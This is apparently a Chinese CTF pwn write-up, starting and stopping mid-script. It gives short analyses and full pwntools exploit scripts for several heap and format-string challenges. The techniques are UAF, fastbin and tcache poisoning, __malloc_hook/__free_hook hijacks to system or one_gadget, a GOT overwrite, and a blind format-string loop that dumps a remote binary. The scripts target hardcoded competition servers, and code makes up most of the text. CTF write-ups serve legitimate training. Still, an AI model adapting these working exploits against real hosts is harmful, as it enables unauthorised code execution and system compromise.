libc.sym[&#x27;global_max_fast&#x27;]\tmain_arena = malloc_hook + 0x10\tli(&#x27;libc_base: &#x27; + hex(libc_base))\tli(&#x27;malloc_hook: &#x27; + hex(malloc_hook))\t#chunk_addr = heap + 0xc8\trm(1)\tad3()\tmd(1, p64(heap + 0x250) + p64(flag_addr - 0x10))\t#md(1, p64(0) + p64(flag_addr - 0x10))\tad2(p64(main_arena + 0x352) + p64(heap + 0x3f0))\trm(2)\tad(0x100) # modify random num\tmd(2, p64(main_arena + 352))\tsla(&#x27;scenery\\n&#x27;, &#x27;5&#x27;)\tsl(&#x27;2&#x27;)\t#db()def finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process()\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n\n\nPWN2[baby dev]一看是内核pwn，应该是个溢出漏洞采用ret2user利用手段吧，看了几下就没看了。。。tcl学kenel pwn去。。。。\nPWN3[baby pwn]这个题是个c++ pwn，运行后直接开辟直接崩溃，我大为惊喜，分析逆向代码有点乱，采用exp乱试一番，发现程序崩溃，因为程序有个指针函数调用，且该函数指针存放在堆中，若能修改该函数指针，即可实现修改rip，这是个uaf漏洞，先通过打印函数leak出libc，再修改该函数指针为one_gadget，但是所有one_gadget都不通，在libc中找了半天的gadget，最终找到个改变rsp的gadget调整一下one_gadget中的execve第二个参数，远程通了。。\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0gan# Env: Linux arch 5.8.14-arch1-1from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li  = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;pwn&#x27;MODIFY_LD = 0arch = &#x27;64&#x27;libc_v = &#x27;2.23&#x27;ld_path   = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/ld-linux-x86-64.so.2&#x27;libs_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib&#x27;libc_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# change ld path if(MODIFY_LD):\tos.system(&#x27;cp &#x27; + elf_path + &#x27; &#x27; + elf_path + &#x27;.bk&#x27;)\tchange_ld_cmd = &#x27;patchelf  --set-interpreter &#x27; + ld_path +&#x27; &#x27; + elf_path\tos.system(change_ld_cmd)\tli(&#x27;modify ld ok!&#x27;)\texit(0)# remote server ip and portserver_ip = &quot;8.131.69.237&quot;server_port = 52642# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def init():\tsla(&#x27;exit&#x27;, &#x27;1&#x27;)\tdef cre():\tsla(&#x27;exit&#x27;, &#x27;2&#x27;)\tdef ad(sz):\tsla(&#x27;exit&#x27;, &#x27;3&#x27;)\t\tsla(&#x27;:&#x27;, str(sz))\tdef se(d):\tsla(&#x27;exit&#x27;, &#x27;4&#x27;)\t\tsa(&#x27;:&#x27;, d)\tdef dp():\tsla(&#x27;exit&#x27;, &#x27;5&#x27;)\tdef size():\tsla(&#x27;exit&#x27;, &#x27;6&#x27;)\tdef q():\tsla(&#x27;exit&#x27;, &#x27;7&#x27;)\t#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tinit()\tcre()\tad(0x88)\tdp()\tru(&#x27;show:&#x27;)\tr(9)\theap = u64(r(8))\tli(&#x27;heap: &#x27; + hex(heap))\tad(0x88)\tinit()\tdp()\tleak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)\tlibc_base = leak - libc.sym[&#x27;__malloc_hook&#x27;]  - 0x10  - 88\tog = libc_base + libc.sym[&#x27;system&#x27;]\t#gadget = libc_base + 0x115260\tsetcontext = libc_base + libc.sym[&#x27;setcontext&#x27;] + 0x3d\tog = libc_base + 0x45226\t#og = libc_base + 0x4527a\t#og = libc_base + 0xf0364\tog = libc_base + 0xf1207\t#0x000000000007218c : mov rdi, rbx ; call qword ptr [rax + 0x18]\t#0x000000000012c8d1 : mov rdi, r10 ; call qword ptr [rax + 0x20]\trecall = libc_base + 0x7218c\tli(&#x27;leak: &#x27; + hex(leak))\tli(&#x27;libc_base: &#x27; + hex(libc_base))\tad(0x88)\ttarget_chunk = heap - 0xc0 + 8\tli(&#x27;target_chunk: &#x27; + hex(target_chunk))\tp = p64(target_chunk) # set rax value\tp += p64(recall) # rax + 0x10\tp += p64(og)     # rax + 0x18\tse(p)\tdb()\tsize()def finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path, &quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path&#125; )\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n\n\n\n\n\n\nPWN4[引流之主]采用glob函数打开一个目录，采用*类似与通配符，遍历文件，由于涉及到堆的开辟与释放，开辟内存大的话，存在unsorted bin管理，堆中存在main_arena附近地址，通过uaf漏洞泄漏libc，然后采用fastbin attack修改__malloc_hook为one_gadget即可\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0gan# Env: Linux arch 5.8.14-arch1-1from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;pwn&#x27;libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# remote server ip and portserver_ip = &quot;112.126.71.170&quot;server_port = 45123# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def ad():\tsleep(0.3)\tsl(&#x27;1&#x27;)def rm(i):\tsleep(0.3)\tsl(&#x27;2&#x27;)\tsl(str(i))def md(i, d):\tsleep(0.3)\tsl(&#x27;3&#x27;)\tsl(str(i))\ts(d)\t\tdef dp(i):\tsleep(0.3)\tsl(&#x27;4&#x27;)\tsl(str(i))def glob(d):\tsleep(0.3)\tsl(&#x27;5&#x27;)\tsl(d)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tglob(&#x27;/proc/self/*\\n&#x27;)\tad() # 0\tdp(0)\tleak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)\tlibc_base = leak - libc.sym[&#x27;__malloc_hook&#x27;] - 0x10 - 0x58\tmalloc_hook = libc_base + libc.sym[&#x27;__malloc_hook&#x27;]\tone_gadget = libc_base + libc.sym[&#x27;system&#x27;]\tone_gadget = libc_base + 0xf1207\tli(&#x27;leak: &#x27; + hex(leak))\tli(&#x27;libc_base: &#x27; + hex(libc_base))\tad() # 1\trm(0)\tmd(0, p64(malloc_hook - 0x23))\tad() # 2\tad() # 3\tp = b&#x27;\\x00&#x27; * (0x13 - 0x8)\tp += p64(0)\tp += p64(one_gadget)\tmd(3, p)\t#db()\tad()# 4\tdef finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process()\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n\n\nPWN5 [把嘴闭上]这个是个glibc的一个历年漏洞，采用mallopt函数能够修改top chunk指针。\n触发poc如下\nhttps://sourceware.org/bugzilla/show_bug.cgi?id=25733            Bug ID: 25733           Summary: mallopt(M_MXFAST) can set global_max_fast to 0           Product: glibc           Version: 2.31            Status: UNCONFIRMED          Severity: normal          Priority: P2         Component: malloc          Assignee: unassigned at sourceware dot org          Reporter: maxkamper at outlook dot com  Target Milestone: ---mallopt(M_MXFAST) can set global_max_fast to 0.This doesn&#x27;t seem intentional because mallopt(M_MXFAST, 0) sets global_max_fastto SMALLBIN_WIDTH.Passing a value between 1-7 to mallopt(M_MXFAST, value) sets global_max_fast to0.Both malloc.c and the mallopt man page document the legitimate range of valuesthat may be passed to mallopt(M_MXFAST, value) as &quot;0 to 80*sizeof(size_t)/4&quot;.In GLIBC versions &gt;= 2.27 this has the same effect as setting global_max_fastto SMALLBIN_WIDTH, but it is perhaps of some concern in GLIBC versions &lt;= 2.26because of how global_max_fast is treated as an indicator of main arenainitialization by malloc_consolidate().If the following example is compiled &amp; run under GLIBC version 2.26, a chunk isallocated overlapping the main arena:#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;malloc.h&gt;int main(void) &#123;    // Populate last_remainder, which is treated as the top chunk size field    // after main arena re-initialization.    void* remainder_me = malloc(0x418);    malloc(0x18); // Avoid top chunk consolidation.    free(remainder_me);    malloc(0x18); // Remainder remainder_me chunk.    // Set global_max_fast to 0.    mallopt(M_MXFAST, 7);    // Trigger malloc_consolidate(), which could happen during large    // allocations/frees, but for the sake of simplicity here just call    // mallopt() again.    mallopt(M_MXFAST, 0x78);    // malloc_consolidate() uses global_max_fast to determine if malloc has    // been initialized. If global_max_fast is 0, malloc_consolidate() will    // re-initialize the main arena, setting its top chunk pointer to an address    // within the main arena. Now last_remainder acts as the top chunk size    // field.    printf(&quot;%p\\n&quot;, malloc(0x418);    return 0;&#125;-- You are receiving this mail because:You are on the CC list for the bug.\n\n但是，上面这个poc只是将top chunk 往下移动了，若我们在两次mallopt之间加入一个malloc(0x1f)的话，能够将top chunk指针修改为main_arena + 88处，这样在下次开辟的时候就能开辟到main_arena+ 88处了，虽然能够修改main_arena + 88 以上的内存，但是不能修改top chunk指针指向我们的目标地址，我想的是修改_IO_2_1_stdout_伪造虚表劫持，中途开辟的时候容易修改main_arena中的东西，导致开辟内存失败，出错。然后后面放弃了，比赛结束就没做了。。。\n思路听说__free_hook就在这附近，直接开辟到__free_hook劫持即可，也有修改_IO_list_all伪造IO_FILE劫持的。\n更新不断开辟到__free_hook，劫持__free_hook为system。\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0gan# Env: Linux arch 5.8.14-arch1-1from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;pwn&#x27;#libc_path = &#x27;./libc.so.6&#x27;libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;# remote server ip and portserver_ip = &quot;112.126.71.170&quot;server_port = 23548# if local debugLOCAL = 1LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)# 1 ~ 1fdef ad(sz, d):\tsla(&#x27; &gt; &#x27;, &#x27;1&#x27;)\tsla(&#x27; &gt; &#x27;, str(sz))\tsa(&#x27; &gt; &#x27;, d)\tdef rm():\tsla(&#x27; &gt; &#x27;, &#x27;2&#x27;)\tdef ch(p, sz):\tsla(&#x27; &gt; &#x27;, &#x27;3&#x27;)\tsla(&#x27; &gt; &#x27;, str(p))\tsl(str(sz))# 401 ~ 4ffdef ad2(sz, d):\tsla(&#x27; &gt; &#x27;, &#x27;4&#x27;)\tsla(&#x27; &gt; &#x27;, str(sz))\ts(d)def q():\tsla(&#x27; &gt; &#x27;, &#x27;5&#x27;)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tru(&#x27;0x&#x27;)\tlibc_puts = int(r(12), 16)\tli(&#x27;libc_puts: &#x27; + hex(libc_puts))\tsla(&#x27;?&#x27;, str(0x4f8))\ts(&#x27;A&#x27; * 0x4f8)\tad(0x18, &#x27;A&#x27; * 0x18)\trm()\t# set global_max_fast to 0\tch(1, 7)\tad(0x1, &#x27;A&#x27; * 0x1)\t#ad2(0x408, &#x27;A&#x27; * 0x18)\tch(1, 0x78)\tlibc_base = libc_puts - libc.sym[&#x27;puts&#x27;]\tlibc_system = libc_base + libc.sym[&#x27;system&#x27;]\tfree_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]\tmain_arena = libc_base + libc.sym[&#x27;__malloc_hook&#x27;] + 0x10\tad2(0x4f8, &#x27;A&#x27;)\tad2(0x4f8, &#x27;A&#x27;)\tad2(0x4f8, &#x27;A&#x27;)\tad2(0x4f8, &#x27;A&#x27;)\tad2(0x4f8, &#x27;A&#x27;)\t\tp = b&#x27;/bin/sh\\x00&#x27;\tp = p.ljust(0x320, b&#x27;\\x00&#x27;)\tp += p64(libc_system)\tad2(0x4f8, p)\tdb()\trm()def finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process()\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n\n\nPWN6[garden]该glibc是2.29的，程序开辟限定了大小，也之存在一次uaf漏洞利用，和fastbin的开辟，结合tcache bin机制和unsorted bin分割通过uaf构造堆重叠，打印函数打印出unsorted bin的残留信息泄漏出libc，通过堆重叠修该tcache fd指向__free_hook，指针数组已经满了，重新释放掉再开辟即可开辟到__free_hook处，修改为system，free传入’&#x2F;bin&#x2F;sh’即可。\nvulvoid del2()&#123;  int v0; // [rsp+Ch] [rbp-4h]  if ( flag )    exit(1);  puts(&quot;which tree do you want to steal?&quot;);  v0 = inputn();  if ( v0 &gt;= 0 &amp;&amp; v0 &lt;= 8 &amp;&amp; p_arr[v0] )    free((void *)p_arr[v0]);                    // vul  flag = 1;&#125;\n\n\n\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0gan# Env: Linux arch 5.8.14-arch1-1from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li  = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;pwn&#x27;MODIFY_LD = 0arch = &#x27;64&#x27;libc_v = &#x27;2.29&#x27;ld_path   = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/ld-linux-x86-64.so.2&#x27;libs_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib&#x27;libc_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# change ld path if(MODIFY_LD):\tos.system(&#x27;cp &#x27; + elf_path + &#x27; &#x27; + elf_path + &#x27;.bk&#x27;)\tchange_ld_cmd = &#x27;patchelf  --set-interpreter &#x27; + ld_path +&#x27; &#x27; + elf_path\tos.system(change_ld_cmd)\tli(&#x27;modify ld ok!&#x27;)\texit(0)# remote server ip and portserver_ip = &quot;8.131.69.237&quot;server_port = 32452# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def ad(i, d):\tsla(&#x27;&gt;&gt; &#x27;, &#x27;1&#x27;)\tsla(&#x27;?&#x27;, str(i))\tsa(&#x27;?&#x27;, d)def rm(i):\tsla(&#x27;&gt;&gt; &#x27;, &#x27;2&#x27;)\tsla(&#x27;?&#x27;, str(i))def dp(i):\tsla(&#x27;&gt;&gt; &#x27;, &#x27;3&#x27;)\tsla(&#x27;?&#x27;, str(i))def q():\tsla(&#x27;&gt;&gt; &#x27;, &#x27;4&#x27;)def rm2(i):\tsla(&#x27;&gt;&gt; &#x27;, &#x27;5&#x27;)\tsla(&#x27;?&#x27;, str(i))def ad2():\tsla(&#x27;&gt;&gt; &#x27;, &#x27;6&#x27;)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tfor i in range(8):\t\tad(i, &#x27;A&#x27;)\tfor i in range(7):\t\trm(7 - i)\trm(0)\tfor i in range(7):\t\tad(i, &#x27;A&#x27;)\tad2()\tad(7, &#x27;A&#x27;)\tfor i in range(7):\t\trm(7 - i)\trm(0)\tfor i in range(7):\t\tad(i, &#x27;A&#x27; * 8)\t\tad(7, &#x27;A&#x27; * 8)\tdp(7)\tleak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)\tlibc_base = leak - libc.sym[&#x27;__malloc_hook&#x27;] - 0x10 - 96\tfree_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]\tsystem = libc_base + libc.sym[&#x27;system&#x27;]\tli(&#x27;libc_base: &#x27; + hex(libc_base))\tfor i in range(7):\t\trm(7 - i)\trm2(0)\tfor i in range(7):\t\tad(i + 1, &#x27;A&#x27;)\tp = b&#x27;A&#x27; * 0xd0\tp += p64(0) + p64(0x110)\tp += p64(0) + p64(0)\tad(8, p)\trm(0)\trm(8)\tp = b&#x27;A&#x27; * 0xd0\tp += p64(0) + p64(0x110)\tp += p64(free_hook) + p64(0)\tad(8, p)\tfor i in range(8):\t\trm(i)\tfor i in range(7):\t\tad(i, &#x27;/bin/sh\\x00&#x27;)\tad(7, p64(system))\t#db()\trm(1)\tdef finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path, &quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path&#125; )\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n\n\n\n\n祥云总决赛pwn解题模式pwn1字符串漏洞盲打pwn，根据字符串漏洞dump远程文件\n#! /usr/bin/env python3from pwn import *context.log_level = &#x27;critical&#x27;f = open(&quot;pwn_bin&quot;, &quot;ab+&quot;)begin = 0x400000offset = 0i=0while True:\tio = remote(&#x27;172.20.2.8&#x27;, 15865)\tio.recvuntil(&#x27;floor\\n&#x27;)\taddr = begin + offset\t\tp = b&#x27;%10$sABCD&#x27;\tp = p.ljust(0x10, b&#x27;\\x00&#x27;)\tp += p64(0x0) * 2\tp += p64(addr)\tio.sendline(p)\ttry:\t\tinfo = io.recvuntil(&#x27;ABCD&#x27;,drop=True)\t\tremain = io.recvrepeat(0.2)\texcept EOFError:\t\tbreak\tif len(info)==0:\t\toffset += 1\t\tf.write(b&#x27;\\x00&#x27;)\telse:\t\tinfo += b&#x27;\\x00&#x27;\t\toffset += len(info)\t\tf.write(info)\t\tf.flush()\tio.close() f.close()\n\ndump下来后，分析，打印__libc_start_main的got表地址发现后三位为750，是libc2.23的，在进行24轮的输入输出之后，一次输入很大的数据，采用字符串漏洞一次完成修改printf的got表为system函数，下一次输入传入”;sh\\x00”\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  int result; // eax  char v4; // [rsp+0h] [rbp-500h]  sub_400600((__int64)&amp;v4, 0LL, 1280LL);  while ( 1 )  &#123;    puts();    MEMORY[0x602089] = sub_400630((__int64)&quot;DO you want to exit Y/N or y/n &quot;);    sub_400630((__int64)&quot;DO you want to exit Y/N or y/n &quot;);    result = MEMORY[0x602089];    if ( MEMORY[0x602089] == &#x27;Y&#x27; )      break;    result = MEMORY[0x602089];    if ( MEMORY[0x602089] == &#x27;y&#x27; )      break;    read(0LL, (__int64)&amp;v4, 0x501LL);    printf((__int64)&amp;v4);  &#125;  return result;&#125;\n\nexp#!/usr/bin/env python2#-*- coding:utf-8 -*-# Author: i0ganfrom pwn import *import os#from LibcSearcher import *r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]# remote server ip and portserver_ip = &quot;172.20.2.8&quot;server_port = 15865# if local debuglibc_path =&#x27;./libc.so.6&#x27;LOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\toffset = 10\tlibc_start_main = 0x602040\tp = b&#x27;%10$sABCD&#x27;\tp = p.ljust(0x10, b&#x27;\\x00&#x27;)\tp += p64(0x0) * 2\tp += p64(libc_start_main)\tp = p.ljust(0x30, b&#x27;\\x00&#x27;)\ts(p)\tleak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)\tli(&#x27;leak: &#x27; + hex(leak))\toffset__libc_start_main = libc.sym[&#x27;__libc_start_main&#x27;]\t__libc_start_main = leak\tlibc_base = leak - offset__libc_start_main\tsystem = libc_base + libc.sym[&#x27;system&#x27;]\t#libc = LibcSearcher(&#x27;__libc_start_main&#x27;, leak)\tli(&#x27;libc_base: &#x27; + hex(libc_base))\tli(&#x27;__libc_start_main: &#x27; + hex(__libc_start_main))\tsl(&#x27;ok&#x27;)\t#__libc_start_main+240\tfor _ in range(23):\t\tsla(&#x27;ok&#x27;, &#x27;ok&#x27;)\tsla(&#x27;y/n&#x27;, &#x27;n&#x27;)\tprintf_got = 0x602028\toffset = 6 + 6\tb31 = ((system &amp; 0xFFFFFF) &gt;&gt; (8 * 2)) &amp; 0xFF\tb22 = system &amp; 0xFFFF\tli(&#x27;system: &#x27; + hex(system))\tprint(&#x27;b31: &#x27; + hex(b31))\tprint(&#x27;b22: &#x27; + hex(b22))\tli(&#x27;o_printf: &#x27; + hex(libc.sym[&#x27;printf&#x27;]))\tli(&#x27;o_system: &#x27; + hex(libc.sym[&#x27;system&#x27;]))\tli(&#x27;free: &#x27; + hex(libc.sym[&#x27;free&#x27;]))\tp  =  b&#x27;%&#x27; + str(b31) + b&#x27;c%&#x27; + str(offset) + b&#x27;$hhn&#x27;\tp  +=  b&#x27;%&#x27; + str(b22 - b31) + b&#x27;c%&#x27; + str(offset + 1) + b&#x27;$hn&#x27;\tp =  p.ljust(0x8 * 6, b&#x27;\\x00&#x27;)\tp += p64(printf_got + 2)\tp += p64(printf_got + 0)\tsl(p)\t#p =   b&#x27;%&#x27; + str(system &amp; 0xFFFF) + b&#x27;c%&#x27; + str(offset) + b&#x27;$hn&#x27;\t#p = p.ljust(0x20,&#x27;A&#x27;)\t#p = antitone_fmt_payload(6, &#123; printf_got : system &#125;, write_size=&#x27;short&#x27;)\t#p = &#x27;%&#x27; +  str(system &amp; 0xFFFF) + \tdef finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process()\telse:\t\t#elf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n\n\n\n\npwn2exp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0ganfrom pwn import *from LibcSearcher import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;pwn2&#x27;# remote server ip and portserver_ip = &quot;172.20.2.11&quot;server_port = 25688# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def ad(idx, sz):\tsla(&#x27;ce\\n&#x27;, &#x27;1&#x27;)\tsla(&#x27;&gt;&gt;&#x27;, str(idx))\tsla(&#x27;&gt;&gt;&#x27;, str(sz))def rm(idx):\tsla(&#x27;ce\\n&#x27;, &#x27;2&#x27;)\tsla(&#x27;&gt;&gt;&#x27;, str(idx))def md(idx, d):\tsla(&#x27;ce\\n&#x27;, &#x27;3&#x27;)\tsla(&#x27;&gt;&gt;&#x27;, str(idx))\tsa(&#x27;&gt;&gt;&#x27;, d)def dp(idx):\tsla(&#x27;ce\\n&#x27;, &#x27;5&#x27;)\tsla(&#x27;&gt;&gt;&#x27;, str(idx))#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tfor i in range(5):\t\tad(i, 0x10)\tfor i in range(5):\t\trm(i)\tad(0, 0x80)\tad(1, 0x68)\tad(2, 0x68)\tad(3, 0x80)\tad(4, 0x68)\tp = b&#x27;A&#x27; * 0x60\tp += p64(0x90 + 0x70 + 0x70) + b&#x27;\\x90&#x27;\tmd(2, p)\trm(1)\trm(2)\trm(0)\trm(3)\tad(0, 0x80)\tdp(0)\tleak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;) - 584 - 0x10\tli(&#x27;leak &#x27; + hex(leak))\tlib = LibcSearcher(&#x27;__malloc_hook&#x27;, leak)\tlibc_base = leak - libc.sym[&#x27;__malloc_hook&#x27;]\trealloc = libc_base + libc.sym[&#x27;realloc&#x27;]\tgadget = [0x45226, 0x4527a, 0xf0364, 0xf1207] # libc.so.6\t#gadget = [0x45206, 0x4525a, 0xef9f4, 0xf0897] # libc6_2.23-0ubuntu3_amd64\t#gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147] # libc6_2.23-0ubuntu10_amd64.so\tone_gadget = libc_base + gadget[1]\t#one_gadget = libc_base + libc.sym[&#x27;puts&#x27;]\tli(&#x27;libc_base &#x27; + hex(libc_base))\tp = b&#x27;A&#x27; * 0x60 + p64(0) + p64(0x71)\tp += p64(leak - 0x23)\tp += b&#x27;\\n&#x27;\tad(4, 0xa0)\tmd(4, p)\tad(5, 0x68)\tp = b&#x27;A&#x27; * (0x13 - 8)\tp += p64(one_gadget)\tp += p64(realloc + 2)\tp += b&#x27;\\n&#x27;\tad(6, 0x68)\tmd(6, p)\t#db()\tli(&#x27;libc_base &#x27; + hex(libc_base))\t#li(&#x27;libc: &#x27; 